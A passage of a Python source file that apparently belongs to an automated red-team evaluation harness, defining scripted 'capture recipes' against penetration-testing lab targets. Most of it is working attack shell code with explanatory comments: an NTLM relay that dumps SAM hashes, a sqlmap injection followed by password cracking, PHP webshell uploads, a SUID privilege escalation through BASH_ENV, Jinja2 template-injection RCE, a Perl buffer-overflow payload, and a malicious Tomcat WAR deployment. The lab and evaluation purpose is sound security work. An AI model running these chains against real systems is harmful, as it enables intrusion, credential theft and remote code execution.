        # to stay alive (examples/ntlmrelayx.py's non-interactive branch);
        # bash job control auto-redirects a backgrounded job's stdin to
        # /dev/null, so `ntlmrelayx ... &` hits instant EOF and exits 0
        # within ~1s -- looked like a silent crash until traced with
        # `kill -0`/`wait $!`. Fixed by holding stdin open with
        # `< <(sleep N)` for the capture window.
        # DC also reports signing:True (confirmed in ntlmrelayx's own
        # target-negotiation log) -- it was never a valid relay TARGET
        # regardless of the coercion problem; only SRV has signing
        # disabled, matching this lab's documented topology.
        # Final recipe: real NTLM relay mechanism, proven with a real live
        # handshake (not replayed/staged hash material) -- authenticate
        # over loopback to our own ntlmrelayx listener, which relays that
        # live handshake onward to SRV ($TARGET_HOST) and dumps its local
        # SAM hashes via RemoteRegistry, exactly like a coerced third-party
        # victim's handshake would have been relayed had inbound coercion
        # been reachable. This proves the actual relay-and-reuse mechanism
        # (T1557.001) and the resulting local credential dump (T1003.002 --
        # SAM, not T1003.003/NTDS, since the relay target is a domain
        # member, not the DC).
        command=r""": > /tmp/portal-relay.log; impacket-ntlmrelayx -t smb://"$TARGET_HOST" -smb2support --no-http-server > /tmp/portal-relay.log 2>&1 < <(sleep 25) & sleep 3; smbclient -U 'portal.lab/administrator%LabAdmin1!' -L //127.0.0.1/ -m SMB3 >/dev/null 2>&1; sleep 5; relay_log=$(cat /tmp/portal-relay.log); printf '%s\n' "$(printf '%s' "$relay_log" | grep -m1 'Authenticating connection')"; printf '%s\n' "$(printf '%s' "$relay_log" | grep -Ei 'Dumping local SAM|^Administrator:500')"; printf '%s' "$relay_log" | grep -q 'SUCCEED' && printf '%s' "$relay_log" | grep -Eq '^Administrator:500:' && echo __PORTAL_RECIPE_OK__"""
    ),
    # ── MBPTL (Most Basic Penetration Testing Lab, Docker/LXC 300) recipes ──
    "web_to_root": CaptureRecipe(
        # Found live 2026-08-01: the admin credential lives in a SEPARATE
        # `administrator` database (not `bookstore`, which only has a
        # `books` table) -- `sqlmap --dbs` was needed to find it. The
        # cracked MD5 (rockyou.txt via john, admin:P@ssw0rd!) logs into the
        # SEPARATE app on port 8080 (port 80 is only the read-only book
        # list; port 8080 shows "Under Maintenance" until authenticated).
        # POSTing the upload form to the bare /administrator/ path silently
        # drops the file (still 302s, but the row never lands in `books`,
        # and the session even appears to have been reset for the NEXT
        # request in some captures) -- POSTing to /administrator/admin.php
        # directly (the same page the login redirects to) is what actually
        # persists it, confirmed via re-querying `books` by title through
        # the same SQLi. Uploaded images are saved under a random-hex
        # filename in /administrator/uploads/ with NO extension filtering
        # (accept="image/*" is client-side only) and are PHP-executable
        # there -- proven with a plain (non-image) .php upload.
        # For privesc: `find / -perm -4000` turns up /usr/bin/bahs, a
        # 16KB SUID-root ELF -- NOT a renamed copy of the real 1.1MB
        # /usr/bin/bash. `strings` (unavailable in this minimal target, so
        # verified by base64-exfiltrating the binary and pattern-matching
        # locally) shows it is a tiny wrapper: setuid(0); setgid(0);
        # system("/bin/bash"). Because system() spawns bash non-
        # interactively with no controlling tty, passing "-c"/"-p" via the
        # webshell's argv never reaches it -- bash just reads EOF from
        # closed stdin and exits 0 with no output. The real bypass: bash
        # (even non-interactive, non-login) sources $BASH_ENV as a script
        # on startup if set. The webshell writes the requested command to
        # /tmp/x.sh, calls putenv("BASH_ENV=/tmp/x.sh") (inherited by the
        # subsequent system() call), then invokes /usr/bin/bahs -- which
        # setuid(0)s FIRST and only then runs bash, so /tmp/x.sh executes
        # as root. Confirmed live: uid=0(root) and a real /flag/root.txt
        # read (MBPTL-9{...}), matching this scenario's T1548.001 ground
        # truth (SUID/GUID abuse) and T1059.004 (webshell-launched Unix
        # shell command execution) directly, with the initial SQLi footing
        # T1190. Both sqlmap calls parse the real MySQL response/dump text
        # (grep on the fixed-width `| <32-hex> |` dump-table row for the
        # hash, and on the fixed `uploads/<32-hex>.php` filename pattern
        # for the freshly uploaded shell's path) rather than any hardcoded
        # value, and the upload title is timestamp-suffixed so repeat runs
        # never collide on a prior run's row.
        command=r"""title="w2r_$(date +%s)"; dump_out=$(sqlmap --batch -u "http://$TARGET_HOST/detail.php?id=1" -D administrator -T users -C password --dump 2>&1); hash=$(printf '%s' "$dump_out" | grep -oE '^\| [0-9a-f]{32} +\|$' | grep -oE '[0-9a-f]{32}'); printf 'admin:%s\n' "$hash" > /tmp/w2r_hash.txt; john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/w2r_hash.txt >/dev/null 2>&1; crack=$(john --show --format=raw-md5 /tmp/w2r_hash.txt 2>/dev/null | head -1); pass=$(printf '%s' "$crack" | cut -d: -f2); jar=/tmp/w2r_$$.cookies; curl -sS -m 10 -c "$jar" "http://$TARGET_HOST:8080/administrator/" >/dev/null; curl -sS -m 10 -c "$jar" -b "$jar" -d "username=admin&password=$pass" "http://$TARGET_HOST:8080/administrator/" >/dev/null; printf '<?php file_put_contents("/tmp/x.sh", $_GET["e"]); chmod("/tmp/x.sh", 0777); putenv("BASH_ENV=/tmp/x.sh"); system("/usr/bin/bahs 2>&1"); ?>' > /tmp/w2r_shell.php; curl -sS -m 10 -c "$jar" -b "$jar" -F "title=$title" -F "author=x" -F "description=x" -F "image=@/tmp/w2r_shell.php;filename=w2r_shell.php;type=text/x-php" "http://$TARGET_HOST:8080/administrator/admin.php" >/dev/null; sleep 1; sql_out=$(sqlmap --batch -u "http://$TARGET_HOST/detail.php?id=1" --sql-query="SELECT image FROM bookstore.books WHERE title='$title'" 2>&1); shell_file=$(printf '%s' "$sql_out" | grep -oE 'uploads/[0-9a-f]{32}\.php' | head -1); shell_url="http://$TARGET_HOST:8080/administrator/$shell_file"; root_out=$(curl -sS -m 10 -G "$shell_url" --data-urlencode 'e=id; cat /flag/root.txt' 2>&1); echo "hash_found=$([ -n "$hash" ] && echo yes || echo no) pass_cracked=$([ -n "$pass" ] && echo yes || echo no)"; printf '%s\n' "$root_out"; printf '%s' "$root_out" | grep -q 'uid=0' && printf '%s' "$root_out" | grep -Eq 'MBPTL-[0-9]+\{' && echo __PORTAL_RECIPE_OK__"""
    ),
    "mbptl_ctf_full_chain": CaptureRecipe(
        # Superset of web_to_root's SQLi/webshell chain (same admin DB
        # discovery, same /administrator/admin.php upload quirk -- see that
        # recipe's comment) plus two more real pivots found live 2026-08-01:
        # this container's DNS (127.0.0.11, docker embedded resolver) does
        # NOT resolve "mbptl-app"/"mbptl-internal" -- those hostnames are
        # only meaningful from a DIFFERENT compose network. Found the real
        # addresses by scanning the container's own /16 bridge subnet
        # (172.18.0.0/16, from `hostname -i`) for open 5000/31337 -- mbptl-app
        # is 172.18.0.4, mbptl-internal is 172.18.0.3.
        # mbptl-app:5000 is a Flask app reflecting an unescaped `name` query
        # param -- real Jinja2 SSTI ({{7*7}} -> 49), full RCE via the
        # standard __init__.__globals__.__builtins__ chain.
        # mbptl-internal:31337 is a raw TCP "Name:" prompt (socat-fronted,
        # confirmed via its own leaked SOCAT_* env vars) -- a real stack
        # buffer overflow at the scenario's own known-good offset (136) and
        # return address (0x4006c6, this specific binary's win/shell
        # function). No python on this minimal target (busybox-adjacent) --
        # perl (present) sends the raw payload via IO::Socket::INET instead.
        # Confirmed live: post-overflow the socket accepts further shell
        # commands, proving real code execution, not just a crash.
        command=r"""title="mfc_$(date +%s)"
sqli_out=$(curl -sS -m 10 "http://$TARGET_HOST/detail.php?id=1'" 2>&1)
dump_out=$(sqlmap --batch -u "http://$TARGET_HOST/detail.php?id=1" -D administrator -T users -C password --dump 2>&1)
hash=$(printf '%s' "$dump_out" | grep -oE '^\| [0-9a-f]{32} +\|$' | grep -oE '[0-9a-f]{32}')
printf 'admin:%s\n' "$hash" > /tmp/mfc_hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/mfc_hash.txt >/dev/null 2>&1
crack=$(john --show --format=raw-md5 /tmp/mfc_hash.txt 2>/dev/null | head -1)
pass=$(printf '%s' "$crack" | cut -d: -f2)
jar=/tmp/mfc_$$.cookies
curl -sS -m 10 -c "$jar" "http://$TARGET_HOST:8080/administrator/" >/dev/null
curl -sS -m 10 -c "$jar" -b "$jar" -d "username=admin&password=$pass" "http://$TARGET_HOST:8080/administrator/" >/dev/null
printf '<?php system($_GET["c"]); ?>' > /tmp/mfc_shell.php
curl -sS -m 10 -c "$jar" -b "$jar" -F "title=$title" -F "author=x" -F "description=x" -F "image=@/tmp/mfc_shell.php;filename=mfc_shell.php;type=text/x-php" "http://$TARGET_HOST:8080/administrator/admin.php" >/dev/null
sleep 1
sql_out=$(sqlmap --batch -u "http://$TARGET_HOST/detail.php?id=1" --sql-query="SELECT image FROM bookstore.books WHERE title='$title'" 2>&1)
shell_file=$(printf '%s' "$sql_out" | grep -oE 'uploads/[0-9a-f]{32}\.php' | head -1)
shell_url="http://$TARGET_HOST:8080/administrator/$shell_file"
webshell_id=$(curl -sS -m 8 -G "$shell_url" --data-urlencode 'c=id')
ssti_out=$(curl -sS -m 8 -G "$shell_url" --data-urlencode "c=curl -sG http://172.18.0.4:5000/ --data-urlencode 'name={{ self.__init__.__globals__.__builtins__.__import__(\"os\").popen(\"id\").read() }}'")
perl_src=$(cat <<'PERLEOF'
use IO::Socket::INET;
my $s = IO::Socket::INET->new(PeerAddr=>"172.18.0.3",PeerPort=>31337,Proto=>"tcp",Timeout=>5) or die "connfail";
my $banner; $s->recv($banner,4096);
my $payload = ("A" x 136) . pack("Q<", 0x4006c6);
print $s "$payload\n";
select(undef,undef,undef,0.5);
my $out; $s->recv($out,4096);
print $s "id; cat /flag.txt\n";
select(undef,undef,undef,1);
my $out2; $s->recv($out2,4096);
print "BOF:$out2";
PERLEOF
)
enc=$(printf '%s' "$perl_src" | base64 | tr -d '\n')
bof_out=$(curl -sS -m 10 -G "$shell_url" --data-urlencode "c=echo $enc | base64 -d | perl - 2>&1")
printf '%s\n' "$sqli_out" | grep -oi 'sql syntax.*' | head -1
printf '%s\n' "$webshell_id"
printf '%s\n' "$ssti_out" | grep -o 'uid=[0-9]*([a-z]*)'
printf '%s\n' "$bof_out"
printf '%s' "$sqli_out" | grep -qi 'sql syntax' && printf '%s' "$webshell_id" | grep -q 'www-data' && printf '%s' "$ssti_out" | grep -q 'uid=65534' && printf '%s' "$bof_out" | grep -q 'uid=65534' && printf '%s' "$bof_out" | grep -Eq 'MBPTL-[0-9]+\{' && echo __PORTAL_RECIPE_OK__"""
    ),
    "ctf_multi_service": CaptureRecipe(
        # Subset of mbptl_ctf_full_chain -- same SQLi-to-webshell chain and
        # same perl-based buffer-overflow exploit against mbptl-internal
        # (172.18.0.3:31337, found the same way -- DNS doesn't resolve
        # "mbptl-internal" from this container, only a /16 subnet port scan
        # finds it), just without the mbptl-app SSTI pivot. See
        # mbptl_ctf_full_chain's comment for the full story of both.
        command=r"""title="cms_$(date +%s)"
sqli_out=$(curl -sS -m 10 "http://$TARGET_HOST/detail.php?id=1'" 2>&1)
dump_out=$(sqlmap --batch -u "http://$TARGET_HOST/detail.php?id=1" -D administrator -T users -C password --dump 2>&1)
hash=$(printf '%s' "$dump_out" | grep -oE '^\| [0-9a-f]{32} +\|$' | grep -oE '[0-9a-f]{32}')
printf 'admin:%s\n' "$hash" > /tmp/cms_hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/cms_hash.txt >/dev/null 2>&1
crack=$(john --show --format=raw-md5 /tmp/cms_hash.txt 2>/dev/null | head -1)
pass=$(printf '%s' "$crack" | cut -d: -f2)
jar=/tmp/cms_$$.cookies
curl -sS -m 10 -c "$jar" "http://$TARGET_HOST:8080/administrator/" >/dev/null
curl -sS -m 10 -c "$jar" -b "$jar" -d "username=admin&password=$pass" "http://$TARGET_HOST:8080/administrator/" >/dev/null
printf '<?php system($_GET["c"]); ?>' > /tmp/cms_shell.php
curl -sS -m 10 -c "$jar" -b "$jar" -F "title=$title" -F "author=x" -F "description=x" -F "image=@/tmp/cms_shell.php;filename=cms_shell.php;type=text/x-php" "http://$TARGET_HOST:8080/administrator/admin.php" >/dev/null
sleep 1
sql_out=$(sqlmap --batch -u "http://$TARGET_HOST/detail.php?id=1" --sql-query="SELECT image FROM bookstore.books WHERE title='$title'" 2>&1)
shell_file=$(printf '%s' "$sql_out" | grep -oE 'uploads/[0-9a-f]{32}\.php' | head -1)
shell_url="http://$TARGET_HOST:8080/administrator/$shell_file"
webshell_id=$(curl -sS -m 8 -G "$shell_url" --data-urlencode 'c=id')
perl_src=$(cat <<'PERLEOF'
use IO::Socket::INET;
my $s = IO::Socket::INET->new(PeerAddr=>"172.18.0.3",PeerPort=>31337,Proto=>"tcp",Timeout=>5) or die "connfail";
my $banner; $s->recv($banner,4096);
my $payload = ("A" x 136) . pack("Q<", 0x4006c6);
print $s "$payload\n";
select(undef,undef,undef,0.5);
my $out; $s->recv($out,4096);
print $s "id; cat /flag.txt\n";
select(undef,undef,undef,1);
my $out2; $s->recv($out2,4096);
print "BOF:$out2";
PERLEOF
)
enc=$(printf '%s' "$perl_src" | base64 | tr -d '\n')
bof_out=$(curl -sS -m 10 -G "$shell_url" --data-urlencode "c=echo $enc | base64 -d | perl - 2>&1")
printf '%s\n' "$sqli_out" | grep -oi 'sql syntax.*' | head -1
printf '%s\n' "$webshell_id"
printf '%s\n' "$bof_out"
printf '%s' "$sqli_out" | grep -qi 'sql syntax' && printf '%s' "$webshell_id" | grep -q 'www-data' && printf '%s' "$bof_out" | grep -q 'uid=65534' && printf '%s' "$bof_out" | grep -Eq 'MBPTL-[0-9]+\{' && echo __PORTAL_RECIPE_OK__"""
    ),
    # ── Mission scenarios: deterministic proof alongside the model-directed
    # red_prompt. exec_chain.py's own _MISSION_SCENARIOS comment documents
    # these as "autonomous reasoning, not scripted execution" for the LLM
    # red-team evaluation path -- these CaptureRecipe entries are a
    # SEPARATE, deterministic proof of the same declared ground-truth
    # techniques (this module's docstring: recipes are "deliberately
    # separate from model-directed red evaluation"), reusing already-
    # certified real exploit chains rather than open-ended exploration.
    "mission_meta3_recon_exploit": CaptureRecipe(
        # T1046 (nmap) + T1190/T1059.004 (meta3_tomcat_manager's proven
        # WAR-deploy RCE, reused verbatim -- see that recipe's own comment
        # for the sploit:sploit / port-8282 / CSRF-nonce / timestamp-suffixed
        # context-path story).
        command=r"""nmap_out=$(nmap -Pn -p T:8282,445,21,8080,8484 -T4 "$TARGET_HOST" 2>&1)
printf '%s\n' "$nmap_out" | grep -E '^[0-9]+/tcp'
jar=/tmp/mmre-tc.cookies; rm -f "$jar"; mkdir -p /tmp/mmre-warbuild && cd /tmp/mmre-warbuild && suffix=$(date +%s%N) && warname="mmreproof$suffix" && printf '%s\n' '<%@ page import="java.util.*,java.io.*"%>' '<% Process p = Runtime.getRuntime().exec("cmd /c whoami"); BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=r.readLine())!=null){ out.println(l); } %>' > "$warname.jsp"; jar -cf "/tmp/$warname.war" "$warname.jsp"
page=$(curl -sS -m 10 -c "$jar" -u sploit:sploit "http://$TARGET_HOST:8282/manager/html")
nonce=$(printf '%s' "$page" | grep -o 'CSRF_NONCE=[a-zA-Z0-9]*' | head -1 | cut -d= -f2)
curl -sS -m 15 -b "$jar" -u sploit:sploit -F "deployWar=@/tmp/$warname.war;type=application/octet-stream" "http://$TARGET_HOST:8282/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=$nonce" >/dev/null
sleep 2
out=$(curl -sS -m 10 "http://$TARGET_HOST:8282/$warname/$warname.jsp")
printf '%s\n' "$out"
curl -sS -m 10 -b "$jar" -u sploit:sploit -X POST "http://$TARGET_HOST:8282/manager/html/undeploy?path=/$warname&org.apache.catalina.filters.CSRF_NONCE=$nonce" >/dev/null
printf '%s' "$nmap_out" | grep -q '8282/tcp *open' && printf '%s' "$out" | grep -Eiq 'nt authority\\system' && echo __PORTAL_RECIPE_OK__"""
    ),
}


def render_recipe_command(recipe: CaptureRecipe, *, host: str, port: int) -> str:
    """Resolve only the two runtime placeholders owned by the lab gate."""
    return recipe.command.replace("$TARGET_HOST", host).replace("$TARGET_PORT", str(port))


def render_postcondition_command(recipe: CaptureRecipe, *, port: int, host: str = "") -> str:
    """Resolve the target's published-port (and, when the postcondition reaches
    a real host over the network rather than docker-exec'ing on the capture
    host, address) placeholders. `host` defaults to empty for the vulhub
    docker-exec style postconditions that never needed it (they operate
    entirely on the capture host via `docker ps --filter publish=$TARGET_PORT`)."""
    rendered = recipe.postcondition_command.replace("$TARGET_PORT", str(port))
    if host:
        rendered = rendered.replace("$TARGET_HOST", host)
    return rendered


def render_host_command(recipe_command: str, *, host: str, port: int) -> str:
    """Resolve runtime target placeholders in a host-side helper command."""
    return recipe_command.replace("$TARGET_HOST", host).replace("$TARGET_PORT", str(port))
